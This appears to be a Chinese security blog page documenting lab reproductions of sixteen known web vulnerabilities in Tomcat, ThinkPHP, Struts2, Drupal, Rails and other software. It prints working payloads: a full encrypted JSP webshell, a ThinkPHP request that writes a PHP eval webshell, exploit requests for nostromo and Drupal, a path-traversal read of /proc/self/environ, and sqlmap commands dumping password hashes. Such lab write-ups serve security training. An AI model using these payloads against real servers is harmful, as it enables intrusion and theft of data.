@@ -1,0 +1,312 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>太阿平台漏洞复现 | Alice01</title>
+    <meta name="author" content="Alice01" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/tx.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ALICE01</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ALICE01</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>太阿平台漏洞复现</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #00a596">
+                    漏洞复现
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="一、tomcat-pass-getshell"><a href="#一、tomcat-pass-getshell" class="headerlink" title="一、tomcat-pass-getshell"></a>一、tomcat-pass-getshell</h2><h4 id="1-访问-manager登录"><a href="#1-访问-manager登录" class="headerlink" title="1.访问&#x2F;manager登录"></a>1.访问&#x2F;manager登录</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tomcat-pass-getshell/1.png" alt="1"></p>
+<h4 id="2-打包jspwebshell为war包"><a href="#2-打包jspwebshell为war包" class="headerlink" title="2.打包jspwebshell为war包"></a>2.打包jspwebshell为war包</h4><blockquote>
+<p>jar -cvf shell.war shell.jsp  </p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tomcat-pass-getshell/2.png" alt="2"></p>
+<h4 id="3-上传war包"><a href="#3-上传war包" class="headerlink" title="3.上传war包"></a>3.上传war包</h4><p>&#x2F;shell&#x2F;shell.jsp为shell路径</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tomcat-pass-getshell/3.png" alt="3"></p>
+<span id="more"></span>
+
+<h4 id="4-getshell"><a href="#4-getshell" class="headerlink" title="4.getshell"></a>4.getshell</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tomcat-pass-getshell/4.jpg" alt="4"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tomcat-pass-getshell/5.jpg" alt="5"></p>
+<h2 id="二、tomcat-文件上传-CVE-2017-12615"><a href="#二、tomcat-文件上传-CVE-2017-12615" class="headerlink" title="二、tomcat 文件上传 (CVE-2017-12615)"></a>二、tomcat 文件上传 (CVE-2017-12615)</h2><h4 id="1-PUT方法探测"><a href="#1-PUT方法探测" class="headerlink" title="1.PUT方法探测"></a>1.PUT方法探测</h4><blockquote>
+<p>OPTIONS &#x2F;xx HTTP&#x2F;1.1</p>
+</blockquote>
+<p>开启了put方法</p>
+<p>![1](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;1.png)</p>
+<h4 id="2-put文件写入"><a href="#2-put文件写入" class="headerlink" title="2.put文件写入"></a>2.put文件写入</h4><p>文件头：</p>
+<blockquote>
+<p>PUT &#x2F;shell.jsp&#x2F; HTTP&#x2F;1.1</p>
+</blockquote>
+<p> POST数据:</p>
+<blockquote>
+<p>&lt;%@page import&#x3D;”java.util.*,javax.crypto.*,javax.crypto.spec.*”%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(“POST”)){String k&#x3D;”e45e329feb5d925b”;&#x2F;*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*&#x2F;session.putValue(“u”,k);Cipher c&#x3D;Cipher.getInstance(“AES”);c.init(2,new SecretKeySpec(k.getBytes(),”AES”));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;</p>
+</blockquote>
+<p>![2](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;2.png)</p>
+<h4 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h4><p>&#x2F;shell.jsp![3](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;3.png)</p>
+<p>![4](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;4.png)</p>
+<h2 id="三、shiro721代码执行-shiro-反序列化-（CVE-2016-4437）"><a href="#三、shiro721代码执行-shiro-反序列化-（CVE-2016-4437）" class="headerlink" title="三、shiro721代码执行&#x2F;shiro 反序列化 （CVE-2016-4437）"></a>三、shiro721代码执行&#x2F;shiro 反序列化 （CVE-2016-4437）</h2><h4 id="1-爆钥链"><a href="#1-爆钥链" class="headerlink" title="1.爆钥链"></a>1.爆钥链</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro/1.png" alt="1"></p>
+<h4 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro/2.png" alt="2"></p>
+<h2 id="四、thinkphp-命令执行-（CVE-2018-1002015）-thinkphp-代码执行-CNVD-2018-24942"><a href="#四、thinkphp-命令执行-（CVE-2018-1002015）-thinkphp-代码执行-CNVD-2018-24942" class="headerlink" title="四、thinkphp 命令执行 （CVE-2018-1002015） &#x2F;thinkphp 代码执行 (CNVD-2018-24942)"></a>四、thinkphp 命令执行 （CVE-2018-1002015） &#x2F;thinkphp 代码执行 (CNVD-2018-24942)</h2><h4 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1.写webshell"></a>1.写webshell</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="http://taie.hantaosec.com:9471/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5C%5D=file_put_contents&vars%5B1%5D%5B%5D=webshell.php&vars%5B1%5D%5B%5D=%3C?php%20eval($_GET%5Bcmd%5D);?%3E">http://taie.hantaosec.com:9471/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0\]=file_put_contents&amp;vars[1][]=webshell.php&amp;vars[1][]=%3C?php%20eval($_GET[cmd]);?%3E</a>)</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="http://taie.hantaosec.com:9471/?s=/index/think/app/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=webshell.php&vars%5B1%5D%5B%5D="><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/1.png" alt="1"></a></p>
+<h4 id="2-getshell-命令执行"><a href="#2-getshell-命令执行" class="headerlink" title="2.getshell&#x2F;命令执行"></a>2.getshell&#x2F;命令执行</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="http://taie.hantaosec.com:9471/webshell.php?cmd=system(%27ls%20/tmp%27)">http://taie.hantaosec.com:9471/webshell.php?cmd=system(%27ls%20/tmp%27)</a>;</p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/2.png" alt="2"></p>
+<h2 id="五、struts2-046-远程代码执行-（CVE-2017-5638）-struts2-052-远程代码执行-（CVE-2017-9805）"><a href="#五、struts2-046-远程代码执行-（CVE-2017-5638）-struts2-052-远程代码执行-（CVE-2017-9805）" class="headerlink" title="五、struts2-046 远程代码执行 （CVE-2017-5638）&#x2F;struts2-052 远程代码执行 （CVE-2017-9805）"></a>五、struts2-046 远程代码执行 （CVE-2017-5638）&#x2F;struts2-052 远程代码执行 （CVE-2017-9805）</h2><h4 id="1-验证"><a href="#1-验证" class="headerlink" title="1.验证"></a>1.验证</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/1.png" alt="1"></p>
+<h4 id="2-命令执行-1"><a href="#2-命令执行-1" class="headerlink" title="2.命令执行"></a>2.命令执行</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/2.png" alt="2"></p>
+<h4 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3.文件上传"></a>3.文件上传</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/3.png" alt="3"></p>
+<p>上传jsp到根目录后二次上传webshell</p>
+<h4 id="4-getshell-1"><a href="#4-getshell-1" class="headerlink" title="4.getshell"></a><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/4.png" alt="4">4.getshell</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/5.png" alt="5"></p>
+<h2 id="六、weblogic-反序列化-CVE-2020-2883"><a href="#六、weblogic-反序列化-CVE-2020-2883" class="headerlink" title="六、weblogic 反序列化_CVE-2020-2883"></a>六、weblogic 反序列化_CVE-2020-2883</h2><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CVE-2020-2883/1.png" alt="1"></p>
+<h2 id="七、dedecms文件上传CVE-2019-8933"><a href="#七、dedecms文件上传CVE-2019-8933" class="headerlink" title="七、dedecms文件上传CVE-2019-8933"></a>七、dedecms文件上传CVE-2019-8933</h2><h4 id="1-模版上传"><a href="#1-模版上传" class="headerlink" title="1.模版上传"></a>1.模版上传</h4><p>uploads&#x2F;dede<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0CVE-2019-8933/1.png" alt="1"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-8933/2.png" alt="2"></p>
+<h4 id="2-代码解析"><a href="#2-代码解析" class="headerlink" title="2.代码解析"></a>2.代码解析</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-8933/3.png" alt="3"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-8933/4.png" alt="4"></p>
+<h2 id="3-getshell-1"><a href="#3-getshell-1" class="headerlink" title="3.getshell"></a>3.getshell</h2><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-8933/5.png" alt="5"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-8933/6.png" alt="6"></p>
+<h2 id="八、seacms-远程命令执行-（CNVD-2020-22721）"><a href="#八、seacms-远程命令执行-（CNVD-2020-22721）" class="headerlink" title="八、seacms 远程命令执行 （CNVD-2020-22721）"></a>八、seacms 远程命令执行 （CNVD-2020-22721）</h2><h4 id="1-代码解析"><a href="#1-代码解析" class="headerlink" title="1.代码解析"></a>1.代码解析</h4><p>&#x2F;manager</p>
+<p>允许ip随便写一个参数</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CNVD-2020-22721/1.png" alt="1"></p>
+<p>抓包后ip参数加webshell</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CNVD-2020-22721/2.png" alt="2"></p>
+<h4 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2.getshell"></a>2.getshell</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CNVD-2020-22721/3.png" alt="3"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CNVD-2020-22721/4.png" alt="4"></p>
+<h2 id="九、ucms-远程命令执行-（CVE-2020-25483）"><a href="#九、ucms-远程命令执行-（CVE-2020-25483）" class="headerlink" title="九、ucms 远程命令执行 （CVE-2020-25483）"></a>九、ucms 远程命令执行 （CVE-2020-25483）</h2><h4 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="1.文件上传"></a>1.文件上传</h4><p>随便新增一个php</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-25483/1.png" alt="1"></p>
+<h4 id="2-代码解析-1"><a href="#2-代码解析-1" class="headerlink" title="2.代码解析"></a>2.代码解析</h4><p>修改 保存 抓包，co参数替换为payload</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-25483/2.png" alt="2"></p>
+<h4 id="3-getshell-2"><a href="#3-getshell-2" class="headerlink" title="3.getshell"></a>3.getshell</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-25483/3.png" alt="3"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-25483/4.png" alt="4"></p>
+<h2 id="十、maccms-远程命令执行（CVE-2017-17733）"><a href="#十、maccms-远程命令执行（CVE-2017-17733）" class="headerlink" title="十、maccms 远程命令执行（CVE-2017-17733）"></a>十、maccms 远程命令执行（CVE-2017-17733）</h2><h4 id="1-代码解析-1"><a href="#1-代码解析-1" class="headerlink" title="1.代码解析"></a>1.代码解析</h4><p>wd参数写木马c.php 密码c</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-17733/1.png" alt="1"></p>
+<h4 id="2-getshell-1"><a href="#2-getshell-1" class="headerlink" title="2.getshell"></a>2.getshell</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-17733/2.png" alt="2"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-17733/3.png" alt="3"></p>
+<h2 id="十一、nostromo-远程命令执行-（CVE-2019-16278）"><a href="#十一、nostromo-远程命令执行-（CVE-2019-16278）" class="headerlink" title="十一、nostromo 远程命令执行 （CVE-2019-16278）"></a>十一、nostromo 远程命令执行 （CVE-2019-16278）</h2><h4 id="1-代码执行"><a href="#1-代码执行" class="headerlink" title="1.代码执行"></a>1.代码执行</h4><p>验证包</p>
+<blockquote>
+<p>POST &#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;bin&#x2F;sh HTTP&#x2F;1.0</p>
+<p>Host: taie.hantaosec.com:36519</p>
+<p>Content-Length: 26</p>
+<p>echo</p>
+<p>echo</p>
+<p>ifconfig 2&gt;&amp;1</p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-16278/1.png" alt="1"></p>
+<h4 id="2-报错解决"><a href="#2-报错解决" class="headerlink" title="2.报错解决"></a>2.报错解决</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-16278/2.png" alt="2"></p>
+<p>换行问题,0d改00解决<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-16278/3.png" alt="3"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-16278/4.png" alt="4"></p>
+<h2 id="十二、jupyter-notebook-命令执行-（CVE-2019-9644）"><a href="#十二、jupyter-notebook-命令执行-（CVE-2019-9644）" class="headerlink" title="十二、jupyter-notebook 命令执行 （CVE-2019-9644）"></a>十二、jupyter-notebook 命令执行 （CVE-2019-9644）</h2><h4 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h4><p>teriminal直接执行系统命令<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-9644/1.png" alt="1"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-9644/2.png" alt="2"></p>
+<h2 id="十三、Rails-代码注入（CVE-2020-8163）"><a href="#十三、Rails-代码注入（CVE-2020-8163）" class="headerlink" title="十三、Rails 代码注入（CVE-2020-8163）"></a>十三、Rails 代码注入（CVE-2020-8163）</h2><h4 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h4><p>&#x2F;main&#x2F;index?IO.popen(%27ls%20&#x2F;tmp%27).read%0A%23</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-8163/1.png" alt="1"></p>
+<h2 id="十四、drupal-代码执行-（CVE-2019-6340）"><a href="#十四、drupal-代码执行-（CVE-2019-6340）" class="headerlink" title="十四、drupal 代码执行 （CVE-2019-6340）"></a>十四、drupal 代码执行 （CVE-2019-6340）</h2><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><blockquote>
+<p>POST &#x2F;node&#x2F;?_format&#x3D;hal_json HTTP&#x2F;1.1<br>Host: taie.hantaosec.com:63503<br>User-Agent:  Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0<br>Connection:  keep-alive<br>Content-Type: application&#x2F;hal+json<br>Accept:  <em>&#x2F;</em><br>Cache-Control: no-cache<br>Content-Length: 645</p>
+<p>{<br> “link”: [<br>   {<br>     “value”: “link”,<br>     “options”: “O:24:&quot;GuzzleHttp\Psr7\FnStream&quot;:2:{s:33:&quot;\u0000GuzzleHttp\Psr7\FnStream\u0000methods&quot;;a:1:{s:5:&quot;close&quot;;a:2:{i:0;O:23:&quot;GuzzleHttp\HandlerStack&quot;:3:{s:32:&quot;\u0000GuzzleHttp\HandlerStack\u0000handler&quot;;s:2:&quot;id&quot;;s:30:&quot;\u0000GuzzleHttp\HandlerStack\u0000stack&quot;;a:1:{i:0;a:1:{i:0;s:6:&quot;system&quot;;}}s:31:&quot;\u0000GuzzleHttp\HandlerStack\u0000cached&quot;;b:0;}i:1;s:7:&quot;resolve&quot;;}}s:9:&quot;_fn_close&quot;;a:2:{i:0;r:4;i:1;s:7:&quot;resolve&quot;;}}”<br>   }<br> ],<br> “_links”: {<br>   “type”: {<br>     “href”: “<a target="_blank" rel="noopener" href="http://taie.hantaosec.com:63503/rest/type/shortcut/default">http://taie.hantaosec.com:63503/rest/type/shortcut/default</a>“<br>   }<br> }<br>}</p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-6340/1.png" alt="1"><br>改s长度与参数<br><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-6340/2.png" alt="2"></p>
+<h2 id="十五、rails-任意文件读取-（CVE-2019-5418）"><a href="#十五、rails-任意文件读取-（CVE-2019-5418）" class="headerlink" title="十五、rails 任意文件读取 （CVE-2019-5418）"></a>十五、rails 任意文件读取 （CVE-2019-5418）</h2><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>&#x2F;chybeta</p>
+<p>accept头传payload</p>
+<blockquote>
+<p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ&#123;&#123;</p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-5418/1.png" alt="1"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-5418/2.png" alt="2"></p>
+<h2 id="十六、HMSv1-0SQL注入"><a href="#十六、HMSv1-0SQL注入" class="headerlink" title="十六、HMSv1.0SQL注入"></a>十六、HMSv1.0SQL注入</h2><h4 id="1-爆库"><a href="#1-爆库" class="headerlink" title="1.爆库"></a>1.爆库</h4><blockquote>
+<p>python3 sqlmap.py -u “<a target="_blank" rel="noopener" href="http://taie.hantaosec.com:34150/doctorlogin.php">http://taie.hantaosec.com:34150/doctorlogin.php</a>“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” –dbs</p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
+<h4 id="2-爆表"><a href="#2-爆表" class="headerlink" title="2.爆表"></a>2.爆表</h4><blockquote>
+<p>python3 sqlmap.py -u “<a target="_blank" rel="noopener" href="http://taie.hantaosec.com:34150/doctorlogin.php">http://taie.hantaosec.com:34150/doctorlogin.php</a>“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” -D mysql –tables</p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
+<h4 id="3-爆字段"><a href="#3-爆字段" class="headerlink" title="3.爆字段"></a>3.爆字段</h4><blockquote>
+<p>python3 sqlmap.py -u “<a target="_blank" rel="noopener" href="http://taie.hantaosec.com:34150/doctorlogin.php">http://taie.hantaosec.com:34150/doctorlogin.php</a>“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” -D mysql -T user -columns</p>
+</blockquote>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
+<p>发现password后指定只爆password列</p>
+<blockquote>
+<p>python3 sqlmap.py -u “<a target="_blank" rel="noopener" href="http://taie.hantaosec.com:34150/doctorlogin.php">http://taie.hantaosec.com:34150/doctorlogin.php</a>“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” -D mysql -T user -C password –dump</p>
+</blockquote>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/4.png" alt="4"></h4><p>密码*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</p>
+<p>解密为root<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
